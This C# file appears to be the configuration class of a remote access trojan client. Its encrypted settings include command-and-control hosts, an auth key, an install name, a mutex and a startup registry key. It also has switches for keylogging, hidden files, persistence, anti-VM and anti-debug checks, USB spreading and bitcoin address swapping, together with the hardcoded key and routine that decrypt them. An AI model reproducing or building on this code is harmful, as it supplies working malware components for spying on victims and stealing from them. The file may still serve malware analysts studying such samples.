using System;
using xClient.Core.Cryptography;
using xClient.Core.Helper;

namespace xClient.Config;

public static class Settings
{
	public static string VERSION = "pnWf6op9LZ8P7cX4Gy3MCPZ8ZaLTt7aG2YWHwy5vYfvJnR1/cxpz0BSmQA37I5Smi1CNuG0P5uWKFXQFNB3ZJA==";

	public static string HOSTS = "IN4sYwJrQq9jV7I4EtN7ImQ6VuY71CFEi48oHABfEqZmmQ7mzVFCZnBrfUyRkEe4WciEoYoLCJPzCguICvYLs1m+pE7IIscPEnu54k+CSFA=";

	public static int RECONNECTDELAY = 3000;

	public static string KEY = "1WvgEMPjdwfqIMeM9MclyQ==";

	public static string AUTHKEY = "NcFtjbDOcsw7Evd3coMC0y4koy/SRZGydhNmno81ZOWOvdfg7sv0Cj5ad2ROUfX4QMscAIjYJdjrrs41+qcQwg==";

	public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;

	public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);

	public static string SUBDIRECTORY = "OC5gkPar9oDB6Zaguky7O22xPommIVnM9kaMpK86d4BoxwHIo/9OcakHWcdPCBmOADx4nuaeZ9e1n0wrhbxJNQ==";

	public static string INSTALLNAME = "aHYioozDZCjGhH4G5JZ1OdADTF2GcJbPA/1K0hbN4oWLMOMkYoipMhqtj8pF3eko/KzINIs1oYPer+aEgXZvMA==";

	public static bool INSTALL = false;

	public static bool STARTUP = false;

	public static string MUTEX = "lgJ5HKDS9w37MJNkzgnM2bSdhjGtJufB9X6ZsHL4bAk8lIsyHUZANzxvpkvqehSM4uw7Vj0BI51AwoqEZUOD3VE860OAgQCJG890fkMV2vU=";

	public static string STARTUPKEY = "Ine91+Mvep/q6CUCIa2XFbrfcra1AcL2mlbkQ6MFrVGX0vIjYd3xuHqKxD/UPmDpkEIVQx3pD3zKa8j9FxosGw==";

	public static bool HIDEFILE = true;

	public static bool ENABLELOGGER = true;

	public static string ENCRYPTIONKEY = "JQI8av0O9QPPkJYeWotn";

	public static string TAG = "Rwsp/4uzvo2872NsfPujk0jtjF0wHs+RSm0NnNndU0qiHwEDnSocC5RAUt2X+npJObDXHEDlYdVGxDxFRmunxw==";

	public static string LOGDIRECTORYNAME = "XoyU5yYCS1iQFahO66Mvyyd7kGedXH9Evopw0SAdcSNZq23Uxyi+Yjt2XE8ZskbrrGwyA+Fy7WS5tMpDLZbk8w==";

	public static string USBSpreadNAME = "7ghHDUFT+ZnvfXzNZv+See7U4LVahN9ul2xzAqJL1py1SOv82yeZ+rg104zhHhTOR1S8If5Toym5LdqnrEG4XQ==";

	public static string BTCAddress = "C92HOVgIPUwhZ061USgUgQhPfmZEhZTboG5t6Gg7817PwoPmy32b8UQZ5x9LChgpikJb3AUlnMbWD/4thJPMTQ==";

	public static bool HIDELOGDIRECTORY = true;

	public static bool HIDEINSTALLSUBDIRECTORY = true;

	public static bool ENABLEPERSISTENCE = false;

	public static bool ENABLEANTISANDBOXIE = false;

	public static bool ENABLEANTIVM = false;

	public static bool ENABLEUSBSPREAD = false;

	public static bool ANTIDEBUG = false;

	public static bool STARTUPPERSISTENCE = false;

	public static bool ENABLEBTCSWAP = false;

	public static bool Initialize()
	{
		if (string.IsNullOrEmpty(VERSION))
		{
			return false;
		}
		AES.SetDefaultKey(ENCRYPTIONKEY);
		TAG = AES.Decrypt(TAG);
		VERSION = AES.Decrypt(VERSION);
		HOSTS = AES.Decrypt(HOSTS);
		SUBDIRECTORY = AES.Decrypt(SUBDIRECTORY);
		INSTALLNAME = AES.Decrypt(INSTALLNAME);
		MUTEX = AES.Decrypt(MUTEX);
		STARTUPKEY = AES.Decrypt(STARTUPKEY);
		LOGDIRECTORYNAME = AES.Decrypt(LOGDIRECTORYNAME);
		USBSpreadNAME = AES.Decrypt(USBSpreadNAME);
		BTCAddress = AES.Decrypt(BTCAddress);
		FixDirectory();
		return true;
	}

	private static void FixDirectory()
	{
		if (!PlatformHelper.Is64Bit)
		{
			switch (SPECIALFOLDER)
			{
			case Environment.SpecialFolder.ProgramFilesX86:
				SPECIALFOLDER = Environment.SpecialFolder.ProgramFiles;
				break;
			case Environment.SpecialFolder.SystemX86:
				SPECIALFOLDER = Environment.SpecialFolder.System;
				break;
			}
			DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
		}
	}
}
